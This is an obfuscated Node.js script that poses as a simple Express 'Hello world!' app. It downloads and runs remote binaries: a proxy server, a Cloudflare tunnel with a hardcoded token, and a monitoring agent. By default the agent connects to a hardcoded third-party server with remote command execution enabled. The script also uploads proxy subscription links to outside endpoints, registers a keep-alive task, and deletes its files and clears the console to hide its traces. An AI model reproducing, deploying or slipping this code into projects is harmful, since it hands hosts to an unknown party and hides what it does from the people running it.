const _0x118b36=_0x31c4;(function(_0x31a183,_0x458545){const _0x15ec74=_0x31c4,_0x4cdde5=_0x31a183();while(!![]){try{const _0x404615=parseInt(_0x15ec74(0x201))/0x1*(-parseInt(_0x15ec74(0x203))/0x2)+-parseInt(_0x15ec74(0x1d2))/0x3*(parseInt(_0x15ec74(0x17f))/0x4)+parseInt(_0x15ec74(0x18f))/0x5*(parseInt(_0x15ec74(0x1cc))/0x6)+parseInt(_0x15ec74(0x178))/0x7*(-parseInt(_0x15ec74(0x166))/0x8)+parseInt(_0x15ec74(0x196))/0x9*(parseInt(_0x15ec74(0x153))/0xa)+-parseInt(_0x15ec74(0x17c))/0xb*(-parseInt(_0x15ec74(0x1f5))/0xc)+parseInt(_0x15ec74(0x18a))/0xd;if(_0x404615===_0x458545)break;else _0x4cdde5['push'](_0x4cdde5['shift']());}catch(_0x2db596){_0x4cdde5['push'](_0x4cdde5['shift']());}}}(_0xd988,0x835a4));const express=require(_0x118b36(0x16f)),app=express(),axios=require(_0x118b36(0x1d4)),os=require('os'),fs=require('fs'),path=require(_0x118b36(0x173)),{promisify}=require(_0x118b36(0x1a9)),exec=promisify(require('child_process')[_0x118b36(0x1c1)]),{execSync}=require(_0x118b36(0x20a)),UPLOAD_URL=process[_0x118b36(0x165)][_0x118b36(0x152)]||'',PROJECT_URL=process[_0x118b36(0x165)][_0x118b36(0x202)]||'',AUTO_ACCESS=process[_0x118b36(0x165)][_0x118b36(0x16b)]||![],FILE_PATH=process[_0x118b36(0x165)]['FILE_PATH']||_0x118b36(0x1ce),SUB_PATH=process[_0x118b36(0x165)][_0x118b36(0x200)]||'sub',PORT=process['env']['SERVER_PORT']||process[_0x118b36(0x165)]['PORT']||0xbb8,UUID=process[_0x118b36(0x165)]['UUID']||_0x118b36(0x176),YOUNGHERO_SERVER=process[_0x118b36(0x165)][_0x118b36(0x1fa)]||'nzag.faiz.us.kg:8008',YOUNGHERO_PORT=process[_0x118b36(0x165)]['YOUNGHERO_PORT']||'',YOUNGHERO_KEY=process[_0x118b36(0x165)][_0x118b36(0x1df)]||_0x118b36(0x1cd),SUIDAO_DOMAIN=process['env'][_0x118b36(0x183)]||_0x118b36(0x185),SUIDAO_AUTH=process[_0x118b36(0x165)]['SUIDAO_AUTH']||_0x118b36(0x1e8),SUIDAO_PORT=process[_0x118b36(0x165)][_0x118b36(0x161)]||0x1f41,CFIP=process[_0x118b36(0x165)][_0x118b36(0x1ab)]||_0x118b36(0x1ec),CFPORT=process['env'][_0x118b36(0x1e0)]||0x1bb,NAME=process['env'][_0x118b36(0x177)]||_0x118b36(0x209);!fs[_0x118b36(0x1af)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x118b36(0x154)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x118b36(0x1e5));let npmPath=path['join'](FILE_PATH,'npm'),phpPath=path[_0x118b36(0x1c2)](FILE_PATH,_0x118b36(0x1de)),webPath=path['join'](FILE_PATH,'web'),botPath=path[_0x118b36(0x1c2)](FILE_PATH,_0x118b36(0x155)),subPath=path[_0x118b36(0x1c2)](FILE_PATH,_0x118b36(0x1f2)),listPath=path[_0x118b36(0x1c2)](FILE_PATH,'list.txt'),bootLogPath=path[_0x118b36(0x1c2)](FILE_PATH,_0x118b36(0x19c)),configPath=path[_0x118b36(0x1c2)](FILE_PATH,_0x118b36(0x206));function deleteNodes(){const _0x1179c9=_0x118b36;try{if(!UPLOAD_URL)return;if(!fs[_0x1179c9(0x1af)](subPath))return;let _0x1b13e7;try{_0x1b13e7=fs['readFileSync'](subPath,_0x1179c9(0x1ba));}catch{return null;}const _0x558bef=Buffer[_0x1179c9(0x1dc)](_0x1b13e7,_0x1179c9(0x1ed))['toString'](_0x1179c9(0x1ba)),_0x369271=_0x558bef['split']('\x0a')[_0x1179c9(0x1d7)](_0x17cd04=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x17cd04));if(_0x369271['length']===0x0)return;return axios[_0x1179c9(0x168)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1179c9(0x1f3)]({'nodes':_0x369271}),{'headers':{'Content-Type':_0x1179c9(0x1b7)}})['catch'](_0x4524d1=>{return null;});}catch(_0x2de1e){return null;}}function cleanupOldFiles(){const _0x1e307a=_0x118b36,_0x511bff=[_0x1e307a(0x1a1),_0x1e307a(0x155),_0x1e307a(0x17d),_0x1e307a(0x1de),_0x1e307a(0x1f2),_0x1e307a(0x19c)];_0x511bff['forEach'](_0x2e1ce9=>{const _0x5f0b79=_0x1e307a,_0x5bd0f9=path[_0x5f0b79(0x1c2)](FILE_PATH,_0x2e1ce9);fs[_0x5f0b79(0x1d8)](_0x5bd0f9,()=>{});});}function _0xd988(){const _0x4e4a39=['/api/add-nodes','path','arm64','2087','6fe3a8fb-1b5e-4b5f-87c5-0f61e733337d','NAME','76853IDJYKC','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','8443','npm\x20is\x20running','11zzGYKz','npm','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','4zWeUCL','Subscription\x20uploaded\x20successfully','./npm','pipe','SUIDAO_DOMAIN','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','shiper.faiz.us.kg','tcp','text/plain;\x20charset=utf-8','then','\x20successfully','13140335miVQeI','?security=tls&sni=','/php\x20-c\x20\x22','npm\x20running\x20error:\x20','\x20>/dev/null\x202>&1','245aPQgud','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','response','arm','Hello\x20world!','YOUNGHERO\x20variable\x20is\x20empty,skip\x20running','nohup\x20','103878sGrpSg','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','push','https://amd64.ssss.nyc.mn/web','error','forEach','boot.log','./php','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://arm64.ssss.nyc.mn/v1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','web','./bot','/bot\x20','--tls','bot\x20is\x20running.','set','vmess','?encryption=none&security=tls&sni=','util','./web','CFIP','/vmess-suidao','chmod','pop','existsSync','true','tunnel.json','443','Empowerment\x20success\x20for\x20','readFileSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','finish','application/json','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','block','utf-8','vless','SUIDAO_DOMAIN:','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','writeFileSync','SUIDAO_DOMAIN\x20or\x20SUIDAO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Error\x20executing\x20command:\x20','exec','join','/npm\x20-s\x20','catch','\x0avless://','php\x20running\x20error:\x20','fileUrl','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/vless-suidao','\x0a\x20\x20\x20\x20','2053','2118gNlIOX','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','./tmp','map','get','127.0.0.1','276609ISYHPI','http\x20server\x20is\x20running\x20on\x20port:','axios','trim','close','filter','unlink','/tunnel.yml\x20run','2083','/trojan-suidao','from','App\x20is\x20running','php','YOUNGHERO_KEY','CFPORT','trojan','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/2go','unlinkSync','\x20already\x20exists','Download\x20','automatic\x20access\x20task\x20added\x20successfully','eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiNzA2N2Y1OGMtYzQ4Yi00N2QxLWI4ZWQtYjNlYTAwODU0NTI4IiwicyI6Ik9UVXpNak13TXpRdFpqYzBZaTAwTkdFNExXRmlPR0V0TWpNMlpqUmhNVFF5TWpoaSJ9','https://amd64.ssss.nyc.mn/v1','Skipping\x20adding\x20automatic\x20access\x20task','freedom','www.visa.com.sg','base64','send','\x0a\x20\x20\x0atrojan://','https://arm64.ssss.nyc.mn/web','/api/add-subscriptions','sub.txt','stringify','none','2114148nlinUs','test','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','listen','Failed\x20to\x20add\x20URL:\x20','YOUNGHERO_SERVER','rm\x20-rf\x20','split','quic','https+local://8.8.8.8/dns-query','amd','SUB_PATH','460013gmjLvv','PROJECT_URL','4hdacgM','match','message','config.json','TunnelSecret','aarch64','Vls','child_process','php\x20is\x20running','\x20>/dev/null\x202>&1\x20&','UPLOAD_URL','490wPWqeN','log','bot','createWriteStream','toString','Content-Type','2096','all','data','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','xtls-rprx-vision','status','tls','config.yaml','SUIDAO_PORT','/dev/null','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','includes','env','160VuSeUm','unshift','post','Empowerment\x20failed\x20for\x20','length','AUTO_ACCESS','SuidaoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20SuidaoDomain','web\x20is\x20running','http','express','\x20failed:\x20','\x0aclient_secret:\x20'];_0xd988=function(){return _0x4e4a39;};return _0xd988();}app[_0x118b36(0x1d0)]('/',function(_0x5e2906,_0xbd9cb5){const _0x56ffe1=_0x118b36;_0xbd9cb5['send'](_0x56ffe1(0x193));});const config={'log':{'access':_0x118b36(0x162),'error':_0x118b36(0x162),'loglevel':_0x118b36(0x1f4)},'inbounds':[{'port':SUIDAO_PORT,'protocol':_0x118b36(0x1bb),'settings':{'clients':[{'id':UUID,'flow':_0x118b36(0x15d)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x118b36(0x1c9),'dest':0xbba},{'path':_0x118b36(0x1ac),'dest':0xbbb},{'path':_0x118b36(0x1db),'dest':0xbbc}]},'streamSettings':{'network':_0x118b36(0x186)}},{'port':0xbb9,'listen':_0x118b36(0x1d1),'protocol':_0x118b36(0x1bb),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x118b36(0x186),'security':'none'}},{'port':0xbba,'listen':_0x118b36(0x1d1),'protocol':_0x118b36(0x1bb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x118b36(0x1f4),'wsSettings':{'path':'/vless-suidao'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x118b36(0x1fd)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x118b36(0x1d1),'protocol':_0x118b36(0x1a7),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x118b36(0x1ac)}},'sniffing':{'enabled':!![],'destOverride':[_0x118b36(0x16e),'tls',_0x118b36(0x1fd)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x118b36(0x1d1),'protocol':_0x118b36(0x1e1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x118b36(0x1f4),'wsSettings':{'path':_0x118b36(0x1db)}},'sniffing':{'enabled':!![],'destOverride':[_0x118b36(0x16e),_0x118b36(0x15f),_0x118b36(0x1fd)],'metadataOnly':![]}}],'dns':{'servers':[_0x118b36(0x1fe)]},'outbounds':[{'protocol':_0x118b36(0x1eb),'tag':'direct'},{'protocol':'blackhole','tag':_0x118b36(0x1b9)}]};fs[_0x118b36(0x1be)](path[_0x118b36(0x1c2)](FILE_PATH,'config.json'),JSON[_0x118b36(0x1f3)](config,null,0x2));function getSystemArchitecture(){const _0x30ec80=_0x118b36,_0x1610f1=os['arch']();return _0x1610f1===_0x30ec80(0x192)||_0x1610f1===_0x30ec80(0x174)||_0x1610f1===_0x30ec80(0x208)?_0x30ec80(0x192):_0x30ec80(0x1ff);}function downloadFile(_0x1f3e01,_0x2ebfa7,_0x260a96){const _0x968096=_0x118b36,_0x127937=path[_0x968096(0x1c2)](FILE_PATH,_0x1f3e01),_0xf6deee=fs[_0x968096(0x156)](_0x127937);axios({'method':_0x968096(0x1d0),'url':_0x2ebfa7,'responseType':'stream'})[_0x968096(0x188)](_0x4b3a09=>{const _0x1177f5=_0x968096;_0x4b3a09[_0x1177f5(0x15b)][_0x1177f5(0x182)](_0xf6deee),_0xf6deee['on'](_0x1177f5(0x1b6),()=>{const _0x191a4e=_0x1177f5;_0xf6deee[_0x191a4e(0x1d6)](),console[_0x191a4e(0x154)](_0x191a4e(0x1e6)+_0x1f3e01+_0x191a4e(0x189)),_0x260a96(null,_0x1f3e01);}),_0xf6deee['on'](_0x1177f5(0x19a),_0xad698a=>{const _0x42976d=_0x1177f5;fs['unlink'](_0x127937,()=>{});const _0x2c894a=_0x42976d(0x1e6)+_0x1f3e01+_0x42976d(0x170)+_0xad698a[_0x42976d(0x205)];console[_0x42976d(0x19a)](_0x2c894a),_0x260a96(_0x2c894a);});})[_0x968096(0x1c4)](_0x3e381e=>{const _0x42739a=_0x968096,_0x3f0799=_0x42739a(0x1e6)+_0x1f3e01+_0x42739a(0x170)+_0x3e381e[_0x42739a(0x205)];console[_0x42739a(0x19a)](_0x3f0799),_0x260a96(_0x3f0799);});}async function downloadFilesAndRun(){const _0x745791=_0x118b36,_0x681ebc=getSystemArchitecture(),_0x3ae3b3=getFilesForArchitecture(_0x681ebc);if(_0x3ae3b3[_0x745791(0x16a)]===0x0){console[_0x745791(0x154)](_0x745791(0x1b5));return;}const _0x3df976=_0x3ae3b3[_0x745791(0x1cf)](_0x329f84=>{return new Promise((_0x50429b,_0x5a273b)=>{const _0x13de20=_0x31c4;downloadFile(_0x329f84['fileName'],_0x329f84[_0x13de20(0x1c7)],(_0x5976c4,_0x2ef428)=>{_0x5976c4?_0x5a273b(_0x5976c4):_0x50429b(_0x2ef428);});});});try{await Promise[_0x745791(0x15a)](_0x3df976);}catch(_0x238f2e){console[_0x745791(0x19a)]('Error\x20downloading\x20files:',_0x238f2e);return;}function _0x1716d5(_0x521353){const _0x5600b7=_0x745791,_0x545c33=0x1fd;_0x521353[_0x5600b7(0x19b)](_0x2547f7=>{const _0x3c86b2=_0x5600b7,_0x277bd9=path[_0x3c86b2(0x1c2)](FILE_PATH,_0x2547f7);fs[_0x3c86b2(0x1af)](_0x277bd9)&&fs[_0x3c86b2(0x1ad)](_0x277bd9,_0x545c33,_0x1a68c1=>{const _0x8098f5=_0x3c86b2;_0x1a68c1?console[_0x8098f5(0x19a)](_0x8098f5(0x169)+_0x277bd9+':\x20'+_0x1a68c1):console[_0x8098f5(0x154)](_0x8098f5(0x1b3)+_0x277bd9+':\x20'+_0x545c33[_0x8098f5(0x157)](0x8));});});}const _0x3e1085=YOUNGHERO_PORT?[_0x745791(0x181),_0x745791(0x1aa),_0x745791(0x1a2)]:[_0x745791(0x19d),'./web',_0x745791(0x1a2)];_0x1716d5(_0x3e1085);if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x27f0bc=YOUNGHERO_SERVER['includes'](':')?YOUNGHERO_SERVER['split'](':')[_0x745791(0x1ae)]():'',_0x207ac8=new Set([_0x745791(0x1b2),_0x745791(0x17a),_0x745791(0x159),_0x745791(0x175),_0x745791(0x1da),'2053']),_0x42e0c6=_0x207ac8['has'](_0x27f0bc)?_0x745791(0x1b0):'false',_0x337d10=_0x745791(0x171)+YOUNGHERO_KEY+_0x745791(0x1a0)+YOUNGHERO_SERVER+_0x745791(0x1bd)+_0x42e0c6+_0x745791(0x1c8)+UUID;fs[_0x745791(0x1be)](path[_0x745791(0x1c2)](FILE_PATH,_0x745791(0x160)),_0x337d10);const _0x21c9cd='nohup\x20'+FILE_PATH+_0x745791(0x18c)+FILE_PATH+_0x745791(0x197);try{await exec(_0x21c9cd),console[_0x745791(0x154)](_0x745791(0x150)),await new Promise(_0x493210=>setTimeout(_0x493210,0x3e8));}catch(_0x1cdafa){console[_0x745791(0x19a)](_0x745791(0x1c6)+_0x1cdafa);}}else{let _0x5eaeb2='';const _0x5a8a88=[_0x745791(0x1b2),_0x745791(0x17a),_0x745791(0x159),'2087','2083',_0x745791(0x1cb)];_0x5a8a88[_0x745791(0x164)](YOUNGHERO_PORT)&&(_0x5eaeb2=_0x745791(0x1a4));const _0x1c4eec=_0x745791(0x195)+FILE_PATH+_0x745791(0x1c3)+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+'\x20-p\x20'+YOUNGHERO_KEY+'\x20'+_0x5eaeb2+_0x745791(0x151);try{await exec(_0x1c4eec),console[_0x745791(0x154)](_0x745791(0x17b)),await new Promise(_0x3789b3=>setTimeout(_0x3789b3,0x3e8));}catch(_0x386dec){console['error'](_0x745791(0x18d)+_0x386dec);}}}else console[_0x745791(0x154)](_0x745791(0x194));const _0xd84f10=_0x745791(0x195)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x745791(0x1e2);try{await exec(_0xd84f10),console['log'](_0x745791(0x16d)),await new Promise(_0x26d2e9=>setTimeout(_0x26d2e9,0x3e8));}catch(_0x2b68ab){console[_0x745791(0x19a)]('web\x20running\x20error:\x20'+_0x2b68ab);}if(fs[_0x745791(0x1af)](path[_0x745791(0x1c2)](FILE_PATH,'bot'))){let _0x4a2726;if(SUIDAO_AUTH[_0x745791(0x204)](/^[A-Z0-9a-z=]{120,250}$/))_0x4a2726=_0x745791(0x163)+SUIDAO_AUTH;else SUIDAO_AUTH[_0x745791(0x204)](/TunnelSecret/)?_0x4a2726=_0x745791(0x184)+FILE_PATH+_0x745791(0x1d9):_0x4a2726=_0x745791(0x19e)+FILE_PATH+_0x745791(0x15c)+SUIDAO_PORT;try{await exec('nohup\x20'+FILE_PATH+_0x745791(0x1a3)+_0x4a2726+_0x745791(0x151)),console[_0x745791(0x154)]('bot\x20is\x20running'),await new Promise(_0x4be28a=>setTimeout(_0x4be28a,0x7d0));}catch(_0x30e756){console[_0x745791(0x19a)](_0x745791(0x1c0)+_0x30e756);}}await new Promise(_0x247951=>setTimeout(_0x247951,0x1388));}function getFilesForArchitecture(_0x37bb36){const _0x30d894=_0x118b36;let _0x3fdef5;_0x37bb36===_0x30d894(0x192)?_0x3fdef5=[{'fileName':_0x30d894(0x1a1),'fileUrl':_0x30d894(0x1f0)},{'fileName':'bot','fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x3fdef5=[{'fileName':'web','fileUrl':_0x30d894(0x199)},{'fileName':'bot','fileUrl':_0x30d894(0x1e3)}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x1cd562=_0x37bb36===_0x30d894(0x192)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x3fdef5[_0x30d894(0x167)]({'fileName':_0x30d894(0x17d),'fileUrl':_0x1cd562});}else{const _0x4723b5=_0x37bb36==='arm'?_0x30d894(0x19f):_0x30d894(0x1e9);_0x3fdef5[_0x30d894(0x167)]({'fileName':_0x30d894(0x1de),'fileUrl':_0x4723b5});}}return _0x3fdef5;}function _0x31c4(_0x528049,_0x59fb86){const _0xd98889=_0xd988();return _0x31c4=function(_0x31c4cf,_0x3083e9){_0x31c4cf=_0x31c4cf-0x150;let _0x282c13=_0xd98889[_0x31c4cf];return _0x282c13;},_0x31c4(_0x528049,_0x59fb86);}function suidaoType(){const _0x599b94=_0x118b36;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN){console[_0x599b94(0x154)](_0x599b94(0x1bf));return;}if(SUIDAO_AUTH['includes'](_0x599b94(0x207))){fs[_0x599b94(0x1be)](path[_0x599b94(0x1c2)](FILE_PATH,_0x599b94(0x1b1)),SUIDAO_AUTH);const _0x21280a='\x0a\x20\x20tunnel:\x20'+SUIDAO_AUTH[_0x599b94(0x1fc)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x599b94(0x1b1))+_0x599b94(0x1f7)+SUIDAO_DOMAIN+_0x599b94(0x17e)+SUIDAO_PORT+_0x599b94(0x190);fs[_0x599b94(0x1be)](path[_0x599b94(0x1c2)](FILE_PATH,'tunnel.yml'),_0x21280a);}else console[_0x599b94(0x154)]('SUIDAO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}suidaoType();async function extractDomains(){const _0xe9f887=_0x118b36;let _0x507305;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0x507305=SUIDAO_DOMAIN,console['log'](_0xe9f887(0x1bc),_0x507305),await _0x4fd625(_0x507305);else try{const _0x292ddb=fs[_0xe9f887(0x1b4)](path['join'](FILE_PATH,_0xe9f887(0x19c)),_0xe9f887(0x1ba)),_0x175550=_0x292ddb[_0xe9f887(0x1fc)]('\x0a'),_0x51cf71=[];_0x175550[_0xe9f887(0x19b)](_0x1b6fe6=>{const _0x3e3e18=_0xe9f887,_0x3a0403=_0x1b6fe6[_0x3e3e18(0x204)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3a0403){const _0x262e93=_0x3a0403[0x1];_0x51cf71[_0x3e3e18(0x198)](_0x262e93);}});if(_0x51cf71[_0xe9f887(0x16a)]>0x0)_0x507305=_0x51cf71[0x0],console[_0xe9f887(0x154)]('SuidaoDomain:',_0x507305),await _0x4fd625(_0x507305);else{console[_0xe9f887(0x154)](_0xe9f887(0x16c)),fs[_0xe9f887(0x1e4)](path[_0xe9f887(0x1c2)](FILE_PATH,_0xe9f887(0x19c)));async function _0x4ed8fe(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x1c45bd){}}_0x4ed8fe(),await new Promise(_0x14d9cd=>setTimeout(_0x14d9cd,0xbb8));const _0x5147d9=_0xe9f887(0x19e)+FILE_PATH+_0xe9f887(0x15c)+SUIDAO_PORT;try{await exec(_0xe9f887(0x195)+path[_0xe9f887(0x1c2)](FILE_PATH,_0xe9f887(0x155))+'\x20'+_0x5147d9+_0xe9f887(0x151)),console[_0xe9f887(0x154)](_0xe9f887(0x1a5)),await new Promise(_0x17aaaf=>setTimeout(_0x17aaaf,0xbb8)),await extractDomains();}catch(_0x12ead0){console[_0xe9f887(0x19a)](_0xe9f887(0x1c0)+_0x12ead0);}}}catch(_0x2f1619){console[_0xe9f887(0x19a)]('Error\x20reading\x20boot.log:',_0x2f1619);}async function _0x4fd625(_0x5440be){const _0x18cf68=_0xe9f887,_0x345652=execSync(_0x18cf68(0x179),{'encoding':_0x18cf68(0x1ba)}),_0x1ae013=_0x345652[_0x18cf68(0x1d5)]();return new Promise(_0x13c327=>{setTimeout(()=>{const _0x4f2677=_0x31c4,_0x144ff6={'v':'2','ps':NAME+'-'+_0x1ae013,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4f2677(0x1f4),'net':'ws','type':_0x4f2677(0x1f4),'host':_0x5440be,'path':'/vmess-suidao?ed=2560','tls':'tls','sni':_0x5440be,'alpn':''},_0x18c995=_0x4f2677(0x1c5)+UUID+'@'+CFIP+':'+CFPORT+_0x4f2677(0x1a8)+_0x5440be+'&type=ws&host='+_0x5440be+'&path=%2Fvless-suidao%3Fed%3D2560#'+NAME+'-'+_0x1ae013+'\x0a\x20\x20\x0avmess://'+Buffer[_0x4f2677(0x1dc)](JSON[_0x4f2677(0x1f3)](_0x144ff6))['toString'](_0x4f2677(0x1ed))+_0x4f2677(0x1ef)+UUID+'@'+CFIP+':'+CFPORT+_0x4f2677(0x18b)+_0x5440be+'&type=ws&host='+_0x5440be+'&path=%2Ftrojan-suidao%3Fed%3D2560#'+NAME+'-'+_0x1ae013+_0x4f2677(0x1ca);console['log'](Buffer[_0x4f2677(0x1dc)](_0x18c995)[_0x4f2677(0x157)](_0x4f2677(0x1ed))),fs[_0x4f2677(0x1be)](subPath,Buffer[_0x4f2677(0x1dc)](_0x18c995)['toString']('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app[_0x4f2677(0x1d0)]('/'+SUB_PATH,(_0x19ec8b,_0x54059b)=>{const _0x37a3dc=_0x4f2677,_0x762f72=Buffer['from'](_0x18c995)['toString'](_0x37a3dc(0x1ed));_0x54059b[_0x37a3dc(0x1a6)](_0x37a3dc(0x158),_0x37a3dc(0x187)),_0x54059b[_0x37a3dc(0x1ee)](_0x762f72);}),_0x13c327(_0x18c995);},0x7d0);});}}async function uplodNodes(){const _0x527411=_0x118b36;if(UPLOAD_URL&&PROJECT_URL){const _0x4df305=PROJECT_URL+'/'+SUB_PATH,_0x1b059e={'subscription':[_0x4df305]};try{const _0x5ae3a2=await axios['post'](UPLOAD_URL+_0x527411(0x1f1),_0x1b059e,{'headers':{'Content-Type':_0x527411(0x1b7)}});if(_0x5ae3a2['status']===0xc8)console[_0x527411(0x154)](_0x527411(0x180));else return null;}catch(_0x14f94e){if(_0x14f94e['response']){if(_0x14f94e[_0x527411(0x191)][_0x527411(0x15e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x527411(0x1af)](listPath))return;const _0x34251c=fs[_0x527411(0x1b4)](listPath,_0x527411(0x1ba)),_0x249ca7=_0x34251c[_0x527411(0x1fc)]('\x0a')[_0x527411(0x1d7)](_0x3c195b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x527411(0x1f6)](_0x3c195b));if(_0x249ca7[_0x527411(0x16a)]===0x0)return;const _0x4cb8b9=JSON[_0x527411(0x1f3)]({'nodes':_0x249ca7});try{await axios[_0x527411(0x168)](UPLOAD_URL+_0x527411(0x172),_0x4cb8b9,{'headers':{'Content-Type':'application/json'}});if(response['status']===0xc8)console['log'](_0x527411(0x180));else return null;}catch(_0xaddc52){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x369e0b=_0x31c4,_0x1d67bd=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(YOUNGHERO_PORT)_0x1d67bd[_0x369e0b(0x198)](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x1d67bd[_0x369e0b(0x198)](phpPath);exec(_0x369e0b(0x1fb)+_0x1d67bd[_0x369e0b(0x1c2)]('\x20')+_0x369e0b(0x18e),_0x539107=>{const _0x26c7b3=_0x369e0b;console['clear'](),console[_0x26c7b3(0x154)](_0x26c7b3(0x1dd)),console[_0x26c7b3(0x154)](_0x26c7b3(0x1b8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4512a3=_0x118b36;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4512a3(0x154)](_0x4512a3(0x1ea));return;}try{const _0x5d3a36=await axios[_0x4512a3(0x168)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x4512a3(0x154)](_0x4512a3(0x1e7));}catch(_0x13a05c){console[_0x4512a3(0x19a)](_0x4512a3(0x1f9)+_0x13a05c[_0x4512a3(0x205)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x118b36(0x1f8)](PORT,()=>console[_0x118b36(0x154)](_0x118b36(0x1d3)+PORT+'!'));
